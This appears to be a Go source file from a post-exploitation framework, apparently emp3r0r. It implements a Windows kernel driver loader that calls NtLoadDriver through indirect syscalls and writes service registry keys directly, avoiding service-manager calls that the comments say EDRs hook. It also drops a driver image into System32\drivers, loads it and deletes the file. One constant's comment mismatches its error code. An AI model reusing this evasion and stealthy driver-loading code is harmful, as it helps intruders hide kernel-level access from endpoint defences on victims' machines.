//go:build windows

// Package driver installs, starts, and stops Windows kernel drivers.
//
// This loader is strictly for signed drivers: it performs no DSE
// (Driver Signature Enforcement) bypass, so the .sys image must carry a
// valid kernel-mode signature (WHQL / attestation signed). Drivers are
// started with NtLoadDriver through the indirect syscall table (same
// technique as core/lib/priv and core/lib/memmod) and the service key is
// written straight into the registry, avoiding SCM (advapi32 service
// control manager) calls that EDRs commonly hook.
package driver

import (
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/priv"
	ntsyscall "github.com/jm33-m0/emp3r0r/core/lib/syscall"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// Driver service configuration values (see winnt.h).
const (
	serviceKernelDriver = 1 // SERVICE_KERNEL_DRIVER
	serviceSystemStart  = 1 // SERVICE_SYSTEM_START
	serviceErrorNormal  = 1 // SERVICE_ERROR_NORMAL

	// Registry value names written into the driver service key.
	regImagePath    = "ImagePath"
	regType         = "Type"
	regStart        = "Start"
	regErrorControl = "ErrorControl"
)

// servicesRegistryPath is where kernel driver service keys live under HKLM.
const servicesRegistryPath = `SYSTEM\CurrentControlSet\Services`

// WinVerifyTrust HRESULTs we care about.
const (
	trustEOk           = 0x00000000 // TRUST_E_OK
	trustENosignature  = 0x800B0100 // TRUST_E_NOSIGNATURE
	trustEExpired      = 0x800B0101 // TRUST_E_EXPLICIT_DISTRUST
	trustESubjectNotTr = 0x800B0104 // TRUST_E_SUBJECT_NOT_TRUSTED
	certEUntrustedRoot = 0x800B0109 // CERT_E_UNTRUSTEDROOT
)

// unicodeString mirrors the kernel UNICODE_STRING layout consumed by
// NtLoadDriver / NtUnloadDriver. keepalive pins the heap buffer so the GC
// cannot collect it while the syscall is in flight.
type unicodeString struct {
	Length        uint16
	MaximumLength uint16
	Buffer        *uint16
	keepalive     []uint16
}

// newUnicodeString builds a NULL-terminated UNICODE_STRING for an NT object
// path. Length/MaximumLength are in bytes and exclude/include the trailing
// NULL respectively, as the kernel expects.
func newUnicodeString(s string) *unicodeString {
	buf := make([]uint16, 0, len(s)+1)
	for _, r := range s {
		buf = append(buf, uint16(r))
	}
	buf = append(buf, 0)
	return &unicodeString{
		Length:        uint16((len(buf) - 1) * 2),
		MaximumLength: uint16(len(buf) * 2),
		Buffer:        &buf[0],
		keepalive:     buf,
	}
}

// ---------------------------------------------------------------------------
// Loading
// ---------------------------------------------------------------------------

// LoadSignedDriver installs a driver service named serviceName pointing at
// driverPath and starts it with NtLoadDriver (indirect syscall).
//
// driverPath must be an absolute path to a signed .sys file on disk. The
// service key is left in place on success so UnloadDriver can stop the
// driver later.
func LoadSignedDriver(driverPath, serviceName string) (retErr error) {
	table := ntsyscall.RuntimeSyscallTable
	if table == nil {
		return fmt.Errorf("syscall table not initialized")
	}
	if serviceName == "" {
		return fmt.Errorf("service name must not be empty")
	}

	absPath, err := filepath.Abs(driverPath)
	if err != nil {
		return fmt.Errorf("filepath.Abs(%s): %w", driverPath, err)
	}
	if _, err := os.Stat(absPath); err != nil {
		return fmt.Errorf("driver file %s: %w", absPath, err)
	}

	if IsLoaded(serviceName) {
		return fmt.Errorf("driver service %q already exists, unload it first", serviceName)
	}

	// NtLoadDriver requires SeLoadDriverPrivilege on the caller's token.
	if err := priv.EnablePrivilege("SeLoadDriverPrivilege"); err != nil {
		logging.Warningf("SeLoadDriverPrivilege: %v", err)
	}

	existed, err := createDriverServiceKey(serviceName, absPath)
	if err != nil {
		return fmt.Errorf("create driver service key: %w", err)
	}
	if !existed {
		// Only clean up keys we created ourselves, and only on failure:
		// a successful load keeps the key so UnloadDriver can resolve it.
		defer func() {
			if retErr == nil {
				return
			}
			if err := deleteDriverServiceKey(serviceName); err != nil {
				logging.Warningf("cleanup service key %s: %v", serviceName, err)
			}
		}()
	}

	regPath := `\Registry\Machine\System\CurrentControlSet\Services\` + serviceName
	us := newUnicodeString(regPath)
	status, err := table.InvokeSyscall("NtLoadDriver", uintptr(unsafe.Pointer(us)))
	if err != nil {
		return fmt.Errorf("NtLoadDriver: %v", err)
	}
	if status != ntsyscall.STATUS_SUCCESS {
		return fmt.Errorf("NtLoadDriver: status 0x%08X (driver must be signed and privileges held)", status)
	}

	logging.Successf("Driver %q loaded from %s", serviceName, absPath)
	return nil
}

// LoadSignedDriverBytes drops b onto disk as <SystemRoot>\System32\drivers\
// <serviceName>.sys, loads it, then deletes the file (the kernel keeps the
// image mapped). The file is also removed if loading fails.
func LoadSignedDriverBytes(b []byte, serviceName string) error {
	if len(b) == 0 {
		return fmt.Errorf("empty driver image")
	}
	if serviceName == "" {
		return fmt.Errorf("service name must not be empty")
	}

	driversDir := filepath.Join(systemRoot(), "System32", "drivers")
	if err := os.MkdirAll(driversDir, 0o755); err != nil {
		return fmt.Errorf("MkdirAll(%s): %w", driversDir, err)
	}
	dst := filepath.Join(driversDir, serviceName+".sys")
	if err := os.WriteFile(dst, b, 0o644); err != nil {
		return fmt.Errorf("write driver to %s: %w", dst, err)
	}

	loadErr := LoadSignedDriver(dst, serviceName)

	// The image is fully mapped by the kernel once loaded; the file itself
	// is no longer needed (and is removed on failure as well).
	if err := os.Remove(dst); err != nil && !os.IsNotExist(err) {
		logging.Warningf("remove dropped driver %s: %v", dst, err)
	}
	return loadErr
}

// ---------------------------------------------------------------------------
// Unloading
// ---------------------------------------------------------------------------

// UnloadDriver stops the driver with NtUnloadDriver and removes its service
// key.
func UnloadDriver(serviceName string) error {
	table := ntsyscall.RuntimeSyscallTable
	if table == nil {
		return fmt.Errorf("syscall table not initialized")
	}
	if !IsLoaded(serviceName) {
		return fmt.Errorf("driver service %q not found", serviceName)
	}

	// NtUnloadDriver requires SeLoadDriverPrivilege on the caller's token.
	if err := priv.EnablePrivilege("SeLoadDriverPrivilege"); err != nil {
		logging.Warningf("SeLoadDriverPrivilege: %v", err)
	}

	regPath := `\Registry\Machine\System\CurrentControlSet\Services\` + serviceName
	us := newUnicodeString(regPath)
	status, err := table.InvokeSyscall("NtUnloadDriver", uintptr(unsafe.Pointer(us)))
	if err != nil {
		return fmt.Errorf("NtUnloadDriver: %v", err)
	}
	if status != ntsyscall.STATUS_SUCCESS {
		return fmt.Errorf("NtUnloadDriver: status 0x%08X", status)
	}

	if err := deleteDriverServiceKey(serviceName); err != nil {
		logging.Warningf("delete service key %s: %v", serviceName, err)
	}
	logging.Successf("Driver %q unloaded", serviceName)
	return nil
}

// ---------------------------------------------------------------------------
// State queries
// ---------------------------------------------------------------------------

// IsLoaded reports whether a driver service key exists, i.e. the driver has
// been installed (not necessarily that it is running in the kernel).
func IsLoaded(serviceName string) bool {
	if serviceName == "" {
		return false
	}
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, serviceKeyPath(serviceName), registry.QUERY_VALUE)
	if err != nil {
		return false
	}
	key.Close()
	return true
}

// ---------------------------------------------------------------------------
// Registry helpers
// ---------------------------------------------------------------------------

func serviceKeyPath(serviceName string) string {
	return servicesRegistryPath + `\` + serviceName
}

// createDriverServiceKey writes Type/Start/ErrorControl/ImagePath into
// HKLM\SYSTEM\CurrentControlSet\Services\<serviceName>. ImagePath must be
// an NT device path (\??\C:\...) for NtLoadDriver. The key handle is
// closed before returning. The boolean reports whether the key already
// existed.
func createDriverServiceKey(serviceName, driverPath string) (existed bool, err error) {
	key, existed, err := registry.CreateKey(
		registry.LOCAL_MACHINE,
		serviceKeyPath(serviceName),
		registry.SET_VALUE|registry.QUERY_VALUE,
	)
	if err != nil {
		return false, fmt.Errorf("registry.CreateKey(%s): %w", serviceKeyPath(serviceName), err)
	}
	defer key.Close()

	values := []struct {
		name  string
		value uint32
	}{
		{regType, serviceKernelDriver},
		{regStart, serviceSystemStart},
		{regErrorControl, serviceErrorNormal},
	}
	for _, v := range values {
		if err := key.SetDWordValue(v.name, v.value); err != nil {
			return existed, fmt.Errorf("SetDWordValue(%s): %w", v.name, err)
		}
	}
	if err := key.SetExpandStringValue(regImagePath, ntPathFromWin32(driverPath)); err != nil {
		return existed, fmt.Errorf("SetExpandStringValue(%s): %w", regImagePath, err)
	}

	return existed, nil
}

func deleteDriverServiceKey(serviceName string) error {
	err := registry.DeleteKey(registry.LOCAL_MACHINE, serviceKeyPath(serviceName))
	if err == nil || errors.Is(err, windows.ERROR_FILE_NOT_FOUND) || errors.Is(err, windows.ERROR_PATH_NOT_FOUND) {
		return nil
	}
	return err
}

// ntPathFromWin32 converts a Win32 path (C:\foo\bar.sys) into the NT device
// path form (\??\C:\foo\bar.sys) expected by NtLoadDriver. UNC paths become
// \??\UNC\server\share.
func ntPathFromWin32(path string) string {
	path = filepath.Clean(path)
	switch {
	case strings.HasPrefix(path, `\??\`):
		// already in NT device path form
		return path
	case strings.HasPrefix(path, `\\?\`):
		return `\??\` + path[len(`\\?\`):]
	case strings.HasPrefix(path, `\\`):
		return `\??\UNC\` + strings.TrimPrefix(path, `\\`)
	case len(path) >= 2 && path[1] == ':':
		return `\??\` + path
	case strings.HasPrefix(path, `\`):
		return `\??\` + path
	default:
		if abs, err := filepath.Abs(path); err == nil {
			return ntPathFromWin32(abs)
		}
		return `\??\` + path
	}
}

func systemRoot() string {
	if root := os.Getenv("SystemRoot"); root != "" {
		return root
	}
	return `C:\Windows`
}

// ---------------------------------------------------------------------------
// Signature verification (WinVerifyTrust)
// ---------------------------------------------------------------------------

// IsDriverSigned verifies the embedded Authenticode signature of path with
// WinVerifyTrust (WINTRUST_ACTION_GENERIC_VERIFY_V2) using cached catalog
// data only (no network). It returns true only if the file carries a valid
// signature chain that chains to a trusted root.
func IsDriverSigned(path string) (bool, error) {
	abs, err := filepath.Abs(path)
	if err != nil {
		return false, fmt.Errorf("filepath.Abs(%s): %w", path, err)
	}
	utf16Path, err := windows.UTF16PtrFromString(abs)
	if err != nil {
		return false, fmt.Errorf("UTF16PtrFromString: %w", err)
	}

	fileInfo := &windows.WinTrustFileInfo{
		Size:     uint32(unsafe.Sizeof(windows.WinTrustFileInfo{})),
		FilePath: utf16Path,
	}
	data := &windows.WinTrustData{
		Size:                            uint32(unsafe.Sizeof(windows.WinTrustData{})),
		UIChoice:                        windows.WTD_UI_NONE,
		RevocationChecks:                windows.WTD_REVOKE_NONE,
		UnionChoice:                     windows.WTD_CHOICE_FILE,
		FileOrCatalogOrBlobOrSgnrOrCert: unsafe.Pointer(fileInfo),
		StateAction:                     windows.WTD_STATEACTION_VERIFY,
		// CACHE_ONLY_URL_RETRIEVAL keeps verification offline; catalog
		// signatures for OS-shipped drivers verify without the network.
		ProvFlags: windows.WTD_CACHE_ONLY_URL_RETRIEVAL,
	}

	// Release the WVT state no matter what we return.
	defer func() {
		data.StateAction = windows.WTD_STATEACTION_CLOSE
		_ = windows.WinVerifyTrustEx(0, &windows.WINTRUST_ACTION_GENERIC_VERIFY_V2, data)
	}()

	err = windows.WinVerifyTrustEx(0, &windows.WINTRUST_ACTION_GENERIC_VERIFY_V2, data)
	if err == nil {
		return true, nil
	}

	var errno syscall.Errno
	if !errors.As(err, &errno) {
		return false, fmt.Errorf("WinVerifyTrustEx: %w", err)
	}

	switch errno {
	case trustENosignature, trustESubjectNotTr, certEUntrustedRoot, trustEExpired:
		return false, nil
	default:
		return false, fmt.Errorf("WinVerifyTrustEx: 0x%08X", uint32(errno))
	}
}
